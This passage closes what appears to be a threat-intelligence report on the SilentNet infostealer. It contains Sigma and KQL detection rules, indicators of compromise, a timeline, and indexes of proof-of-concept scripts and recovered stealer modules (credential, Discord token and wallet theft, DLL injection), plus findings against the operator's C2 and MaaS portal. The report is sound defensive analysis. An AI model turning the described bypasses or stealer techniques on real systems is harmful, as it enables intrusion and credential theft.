3. **Block CDN path pattern** — `/cdn/e/[a-f0-9]{12}` at web proxy
4. **Block beacon headers outbound** — `X-Runtime-Env: jre-embedded` at proxy/firewall
5. **Scan for staging directory** — `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\`
6. **Hunt for spawn log** — `%TEMP%\_spawn.log`
7. **Check named pipe** — `\\.\pipe\NtProfileSync` active on endpoints

### SIEM / EDR Detection Rules

```yaml
# Sigma — SilentNet Staging Directory
title: SilentNet Infostealer Staging Directory
status: stable
logsource:
  category: file_event
  product: windows
detection:
  selection:
    TargetFilename|contains: \Microsoft\Windows\NtProfileIndex\
  condition: selection
level: high
tags: [malware.infostealer, silentnet]

---
# Sigma — SilentNet Named Pipe
title: SilentNet DLL Injection Named Pipe
status: stable
logsource:
  category: pipe_created
  product: windows
detection:
  selection:
    PipeName: NtProfileSync
  condition: selection
level: critical

---
# Sigma — SilentNet Beacon Header
title: SilentNet C2 Beacon HTTP Header
status: stable
logsource:
  category: proxy
detection:
  selection:
    cs-headers|contains:
      - "X-Runtime-Env: jre-embedded"
      - "x-cdn-origin-verify: trusted-upstream"
  condition: selection
level: high
```

### Threat Hunting Queries

```kql
// KQL — NtProfileIndex staging directory activity
DeviceFileEvents
| where FolderPath contains "NtProfileIndex"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessName

// KQL — python.exe spawned from unusual Windows path
DeviceProcessEvents
| where FileName == "python.exe"
| where FolderPath contains "Microsoft\Windows"
| where not(FolderPath contains "WindowsApps")
| project Timestamp, DeviceName, FolderPath, ProcessCommandLine, InitiatingProcessName

// KQL — Polygon RPC outbound (non-browser)
DeviceNetworkEvents
| where RemoteUrl has_any ("polygon-rpc.com","llamarpc.com","publicnode.com","1rpc.io","drpc.org")
| where InitiatingProcessName !in ("chrome.exe","msedge.exe","firefox.exe")
| project Timestamp, DeviceName, RemoteUrl, InitiatingProcessName

// KQL — Named pipe creation matching SilentNet pattern
DeviceEvents
| where ActionType == "NamedPipeEvent"
| where AdditionalFields contains "NtProfileSync"
| project Timestamp, DeviceName, InitiatingProcessName, AdditionalFields
```

---

## Proof-of-Concept Index

See `poc/README.md` for full usage instructions and requirements.

| File | Vulnerability | Title | Impact |
|---|---|---|---|
| `poc/poc_01_ip_bypass.py` | VULN-01 | Flask IP Allowlist Bypass | Access all /shard/* from any IP |
| `poc/poc_02_db_write.py` | VULN-02 | Unauthenticated DB Write | Inject arbitrary entries into victim database |
| `poc/poc_03_submitlogs_dos.py` | VULN-03 | submitLogs Persistent DoS | 100% crash rate on log submission handler |
| `poc/poc_04_fernet_decrypt.py` | VULN-05 | Fernet Key Decryption | Decrypt any CDN payload version |
| `poc/poc_05_static_bypass.py` | VULN-04 | nginx Static File Bypass | Read all panel CSS/JS without auth |
| `poc/poc_06_blockchain_resolver.py` | VULN-06 | Blockchain C2 Monitor | Real-time C2 domain resolution and monitoring |

---

## Source Files Index

| File | Size | Description |
|---|---|---|
| `source/app.py` | 7,962B | Main orchestrator |
| `source/app_config.py` | 2,756B | Configuration |
| `source/app_contract.py` | 3,141B | Blockchain C2 interaction |
| `source/app_crypto.py` | 2,215B | Cryptographic operations |
| `source/app_handlers.py` | 2,149B | Handler dispatch |
| `source/app_handlers_browser.py` | 14,646B | Browser credential theft |
| `source/app_handlers_browser_extensions.py` | 7,714B | Extension wallet extraction |
| `source/app_handlers_credentials.py` | 9,104B | Credential file harvesting |
| `source/app_handlers_discord.py` | 6,715B | Discord token theft |
| `source/app_handlers_files.py` | 4,520B | File exfiltration |
| `source/app_handlers_firefox.py` | 12,061B | Firefox profile decryption |
| `source/app_handlers_keywords.py` | 3,963B | Keyword file targeting |
| `source/app_handlers_minecraft.py` | 5,531B | Minecraft session theft |
| `source/app_handlers_screenshot.py` | 2,274B | Screen capture |
| `source/app_handlers_system_info.py` | 4,962B | System enumeration |
| `source/app_handlers_wallets.py` | 2,360B | Crypto wallet extraction |
| `source/app_http.py` | 4,440B | HTTP transport layer |
| `source/app_logging.py` | 2,616B | Internal logging |
| `source/app_resources.py` | 1,193B | Resource loader |
| `source/app_resources_browser_module.py` | 1,117B | Browser resource management |
| `source/app_staging.py` | 9,676B | Download / decrypt / launch |
| `source/app_trace.py` | 1,290B | Error tracing |
| `source/app_util.py` | 1,971B | General utilities |
| `source/app_util_crypto.py` | 2,593B | Crypto utilities |
| `source/app_util_dll_injection.py` | 3,867B | DLL injection |
| `source/app_util_file.py` | 1,466B | File system utilities |
| `source/app_util_handle_copy.py` | 8,993B | Handle duplication |
| `source/app_util_pipe.py` | 3,117B | Named pipe IPC |
| `source/app_util_process.py` | 3,500B | Process management |
| `source/app_util_registry.py` | 1,679B | Registry operations |

---

## Timeline

| Time (UTC) | Event |
|---|---|
| 2026-07-20 ~16:19 | Initial sample acquired, Stage 1 JAR analysis begins |
| 2026-07-20 16:28 | Nuitka constant pool extracted (232KB) |
| 2026-07-20 16:32 | Stage 2 AES-CBC decryption successful |
| 2026-07-20 16:34 | Python constant pool unpickled — strings deobfuscated |
| 2026-07-20 16:44 | Fernet key recovered from constant pool |
| 2026-07-20 17:28 | All 30 Python modules decompiled and reconstructed |
| 2026-07-20 17:31 | Polygon smart contract queried — live C2 domain confirmed |
| 2026-07-20 18:05 | Live CDN payload (V2) downloaded and decrypted — 736 files |
| 2026-07-20 18:05 | C2 server active scan begins |
| 2026-07-20 18:30 | nginx static file bypass discovered |
| 2026-07-20 18:31 | Full panel CSS/JS downloaded — admin UI reconstructed |
| 2026-07-20 18:38 | V3 payload observed (21.15MB trimmed bundle) |
| 2026-07-20 18:44 | V1/V2/V3/V4 three-way diff completed |
| 2026-07-20 18:52 | V4 observed — Fernet timestamp rotation confirmed |
| 2026-07-20 18:54 | V4 decrypted — byte-for-byte identical to V2 |
| 2026-07-20 19:00 | X-Runtime-Env header bypass discovered (VULN-01) |
| 2026-07-20 19:03 | /shard/submitData 200 confirmed (VULN-02) |
| 2026-07-20 19:07 | /shard/submitLogs persistent 500 confirmed (VULN-03) |
| 2026-07-20 19:28 | All 7 vulnerabilities documented |
| 2026-07-20 19:28 | 6 POC scripts written |
| 2026-07-20 19:32 | README and POC directory complete |

---

## silentnet.st — MaaS Operator Portal Analysis

> **Scan date:** 2026-07-20 23:46–23:53 UTC  
> **Status:** Active, publicly accessible, no IP allowlist

### Infrastructure Comparison

| Property | thisisafalsepositive.st | silentnet.st |
|---|---|---|
| IP | 185.178.208.191 | 185.178.208.165 |
| Subnet | 185.178.208.0/24 | 185.178.208.0/24 |
| WAF | DDoS-Guard | DDoS-Guard |
| IP Allowlist | Yes (shard/*) | **None** |
| Purpose | Victim data C2 | MaaS operator registration portal |
| Panel accessible | No (IP blocked) | **Yes — fully public** |

### Role Separation

The two domains serve entirely different functions within the MaaS architecture:

- **`thisisafalsepositive.st`** — Victim-facing C2. Receives stolen credentials from infected machines. Operators view their haul here. IP-allowlisted.
- **`silentnet.st`** — Public MaaS marketplace. Threat actors register here to purchase stealer access. No IP restriction — intentionally public.

### MaaS Registration Flow (fully recovered)

```
1.  Buyer visits /auth/signup
2.  Provides their own Discord webhook URL
3.  Browser POSTs {webhookUrl} to /internal/auth/webhookSignup
4.  Server stores webhook, returns {state: "<oauth_token>"}
5.  Browser redirects to Discord OAuth (client_id: 1521202685884235817)
6.  Buyer authenticates with Discord (scope: identify only)
7.  Discord redirects to /auth/discord?code=<code>&state=<token>
8.  Server creates account, POSTs userId + accountKey to buyer's webhook
9.  Buyer logs in at /auth/login with {userId, accountKey}
```

### Discord Application

| Property | Value |
|---|---|
| App ID | `1521202685884235817` |
| Name | `Login` (deliberately generic) |
| Created | 2026-06-29 17:16:22 UTC (21 days before discovery) |
| Icon hash | `5950919b040391f5a3047ca0656367c7` |
| verify_key | `8f003be516de83b6b1de986e8ece1bf5f07331cb329a42d5f829f54fb59b1afb` |
| OAuth scope | `identify` only |
| Bot public | `true` |
| Verified | `false` |

### Route Map

| Route | HTTP | Notes |
|---|---|---|
| `/auth/login` | 200 | Full login page — no IP restriction |
| `/auth/discord` | 200 | Discord OAuth entry |
| `/auth/signup` | 200 | **Public MaaS registration** |
| `/dashboard/` | 200 | Serves login SPA shell |
| `/dashboard/remote` | 200 | Serves login SPA shell |
| `/dashboard/settings` | 200 | Serves login SPA shell |
| `/dashboard/users` | 200 | Serves login SPA shell |
| `/dashboard/victims` | 404 | Not yet implemented |
| `/dashboard/logs` | 404 | Not yet implemented |
| `/dashboard/builds` | 404 | Not yet implemented |
| `/internal/auth/webhookSignup` | 405 GET / POST only | Operator signup backend |
| `/static/*` | 200 | nginx bypass — no auth |

### Static File Comparison vs thisisafalsepositive.st

| File | Size | Hash Match | Notes |
|---|---|---|---|
| `dashboard.css` | 9,476B | **IDENTICAL** | Same codebase |
| `app.js` | 5,038B | **IDENTICAL** | Same codebase |
| `favicon.ico` | 270,622B | **IDENTICAL** | Same branding |
| `style.css` | 38,210B | Different | Minor variation |
| `auth.css` | 6,240B | Different | Minor variation |

### silentnet.st Vulnerabilities

| ID | Title | Severity | Status | Notes |
|---|---|---|---|---|
| VULN-S01 | No Auth on Admin Routes | HIGH | Confirmed | All /dashboard/* publicly accessible |
| VULN-S02 | SSRF via webhookSignup | N/A | Not viable | Server validates Discord webhook URL format |
| VULN-S03 | No Rate Limiting on /auth/login | MEDIUM | Confirmed | 15/15 attempts, no 429, no lockout |
| VULN-S04 | Open Redirect via initialState | N/A | Not confirmed | Redirect handled client-side only |
| VULN-S05 | nginx Static File Exposure | MEDIUM | Confirmed | Same as VULN-04 on thisisafalsepositive.st |
| VULN-S06 | No Invite Gate on /auth/signup | INFO | Confirmed | Anyone can register as MaaS operator |
| VULN-S07 | HTTP 500 on null/typed login fields | MEDIUM | Confirmed | userId=null or array crashes Flask login handler |

### New IOCs

| Indicator | Type | Description |
|---|---|---|
| `silentnet.st` | Domain | MaaS operator portal |
| `185.178.208.165` | IP | Portal server |
| `1521202685884235817` | Discord App ID | OAuth app, created 2026-06-29 |
| `5950919b040391f5a3047ca0656367c7` | Discord Icon Hash | App branding |
| `8f003be516de83b6b1de986e8ece1bf5f07331cb329a42d5f829f54fb59b1afb` | verify_key | Discord app verification key |
| `/internal/auth/webhookSignup` | Endpoint | MaaS signup backend |
| `accountKey` | Auth field | Operator credential field |
